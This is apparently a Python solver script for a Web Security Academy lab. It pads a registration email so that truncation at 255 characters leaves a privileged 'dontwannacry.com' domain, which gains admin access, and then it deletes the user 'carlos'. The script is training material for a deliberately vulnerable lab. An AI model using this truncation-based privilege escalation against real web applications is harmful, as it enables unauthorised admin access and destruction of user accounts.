from web_security_academy.core.utils import print_info, print_success
from web_security_academy.core.email_client import EmailClient
import re


def solve_lab(session):
    email_client = EmailClient(session)
    email = email_client.address

    # Explanation: The user-provided email is sent the link to complete
    # registration. However when the user-provided email is stored in the
    # site's database, it is truncated to have a max length of 255. An
    # attacker can provide a user-controlled email address that, when
    # truncated, ends with "dontwannacry.com", giving the account
    # administrator privileges.

    # Start registering account
    csrf = session.get_csrf_token("/register")
    print_info("Registering an account with the following data:")
    data = {
        "csrf": csrf,
        "username": f"attacker",
        "email": f"{'dontwannacry.com'.zfill(255)}{email_client.address}",
        "password": "123456",
    }
    print(data, end="\n\n")
    session.post_path("/register", data=data)

    # Finish registering account
    email_client.update_emails()
    email = email_client.emails[-1]

    print_success("Received the following email:")
    for category in ("Sent", "From", "To", "Subject"):
        print(f"{category}:".ljust(10) + email[category])
    print(f"\n{email['Body']}", end="\n\n")

    url = re.findall(r"http[\S]+", email["Body"])[0]
    print_info(f'Finish registering account by visiting "{url}"...\n')
    session.get(url)

    # Delete user "carlos"
    session.login("attacker", "123456")
    print_info("Deleting user carlos...")
    session.get_path("/admin/delete?username=carlos")
